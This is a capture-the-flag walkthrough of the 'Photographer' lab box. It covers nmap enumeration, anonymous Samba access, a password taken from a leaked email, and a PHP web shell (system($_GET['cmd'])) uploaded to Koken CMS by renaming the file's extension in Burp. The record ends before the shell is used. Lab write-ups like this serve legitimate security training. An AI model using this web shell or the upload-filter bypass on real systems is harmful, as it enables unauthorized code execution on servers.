- browsed on a browser, gets webpage confirming its a webserver
- checked robots.txt, source code, not found
- Did a service enumeration
```
nmap -sV 192.168.108.76
```

```
- service ports enumeration Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8000/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Two **http** ports found, browsed to **port 8000** and found a Koken admin login
- Also samba services were also found to be running.
### Exploiting samba
- https://docs.centrify.com/Content/zint-samba/ConfigurationUNIXAccess.htm
- https://medium.com/@nmappn/exploiting-smb-samba-without-metasploit-series-1-b34291bbfd63
- connecting to a samba client:
	smbclient -k -L hostname (list info abou samba and smbclient)

-  Use SMB CLient to check for anonymous access
		-N -- no pass
		-L -- list

```
	WORKGROUP            PHOTOGRAPHER
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$ smbclient -N -L //192.168.108.76

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            PHOTOGRAPHER
```

- Check workgroups you can access without passwd:
		-H --host
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$ smbmap -H 192.168.108.76
[+] Guest session   	IP: 192.168.108.76:445	Name: 192.168.108.76                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	sambashare                                        	READ ONLY	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (photographer server (Samba, Ubuntu))
```
- We have read access to sambashare, so accesss it through smbclient:
	```
	smbclient -N //192.168.108.76/sambashare
	```
- Output
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$ smbclient -N //192.168.108.76/sambashare
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 20 18:51:08 2020
  ..                                  D        0  Thu Aug 20 19:08:59 2020
  mailsent.txt                        N      503  Tue Jul 21 04:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 04:22:23 2020

		3300080 blocks of size 1024. 2958792 blocks available
smb: \> more mailsent.txt
getting file \mailsent.txt of size 503 as /tmp/smbmore.QPUKEq (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> nc
nc: command not found
smb: \> zip
zip: command not found
smb: \> unzip
unzip: command not found
smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> get wordpress.bkp.zip
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: \> getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip SMBecho failed (NT_STATUS_CONNECTION_DISCONNECTED). The connection is disconnected now
```

- Dowload the two files using:
get [local-file-name]  -	Copy the file called remote-file-name from the server to the machine running the client. If specified, name the local copy local-file-name. Note that all transfers in smbclient are binary. See also the lowercase command
i.e.
```
get mailsent.txt
```


```
cat mailsent.txt
```

```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$ more mailsent.txt
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$
```

- We have the email of the one who's website was built: **daisa@photographer.com** while the password from mailsent.txt
as **babygirl**

- Create a php file image.php.jpg (extension to trick server into uploading php file as image) with contents
```
   <?php system($_GET['cmd']);?>
```
- On Koken cms dashboard, import the image.
- Intercept, request via burp and rename the uploading file from **image.php.jpg** to **image.php**, then upload the file.
- On Koken cms library, select the file and put the mouse on "Download File" to see where file is hosted on server
